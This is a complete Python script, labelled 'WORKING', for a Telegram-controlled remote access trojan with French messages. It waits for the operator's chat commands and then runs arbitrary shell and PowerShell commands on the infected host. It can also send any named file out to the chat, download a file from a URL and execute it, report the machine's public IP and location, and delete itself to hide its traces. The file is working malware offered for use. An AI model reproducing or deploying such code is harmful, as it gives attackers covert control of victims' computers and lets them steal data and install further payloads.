# WORKING !

import telebot
import platform
import subprocess
import os
import requests

BOT_TOKEN = "%replace_with_ur_token%"
GROUP_CHAT_ID = "" # put your private chat id here without ""
bot = telebot.TeleBot(BOT_TOKEN)
HOSTNAME = platform.node()

def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout or result.stderr

@bot.message_handler(func=lambda message: str(message.chat.id) == str(GROUP_CHAT_ID))
def handle_message(message):
    text = message.text.strip()

    if text.startswith('!cmd'):
        command = text[5:]
        if command:
            output = execute_command(command)
            bot.reply_to(message, f"Résultat de la commande sur {HOSTNAME}:\n{output}")
        else:
            bot.reply_to(message, "Veuillez fournir une commande après !cmd")

    elif text.startswith('!shell'):
        command = text[7:]
        if command:
            output = execute_command(f"powershell -Command \"{command}\"")
            bot.reply_to(message, f"Résultat de la commande PowerShell sur {HOSTNAME}:\n{output}")
        else:
            bot.reply_to(message, "Veuillez fournir une commande après !shell")

    elif text.startswith('!upload'):
        file_path = text[7:].strip()
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"Fichier {file_path}")
        else:
            bot.reply_to(message, "Le fichier spécifié n'existe pas.")

    elif text.startswith('!download'):
        file_url = text[10:].strip()
        response = requests.get(file_url)
        if response.status_code == 200:
            file_name = file_url.split('/')[-1]
            with open(file_name, 'wb') as file:
                file.write(response.content)
            output = execute_command(file_name)
            bot.reply_to(message, f"Résultat de l'exécution de {file_name} sur {HOSTNAME}:\n{output}")
        else:
            bot.reply_to(message, "Échec du téléchargement du fichier.")

    elif text.startswith('!ip'):
        response = requests.get('http://ip-api.com/json')
        if response.status_code == 200:
            data = response.json()
            bot.reply_to(message, f"IP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nTimezone: {data['timezone']}")
        else:
            bot.reply_to(message, "Échec de la récupération des informations IP.")

    elif text.startswith('!kms'):
        os.remove(__file__)
        bot.reply_to(message, "Fichier supprimé.")

    elif text == '!check':
        bot.reply_to(message, f"Connecté - {HOSTNAME}")

    elif text == '!help':
        help_text = (
            "!cmd <commande> : Exécute une commande shell sur l'ordinateur et renvoie le résultat.\n"
            "!shell <commande> : Exécute une commande PowerShell sur l'ordinateur et renvoie le résultat.\n"
            "!upload <chemin_du_fichier> : Télécharge un fichier du chemin spécifié et l'envoie au groupe.\n"
            "!download <url_du_fichier> : Télécharge un fichier depuis une URL spécifiée, l'exécute, et renvoie le résultat.\n"
            "!ip : Récupère l'adresse IP publique de l'ordinateur.\n"
            "!kms : Supprime le fichier client en cours d'exécution.\n"
            "!check : Indique que le client est connecté et montre le nom d'hôte."
        )
        bot.reply_to(message, help_text)

bot.polling()
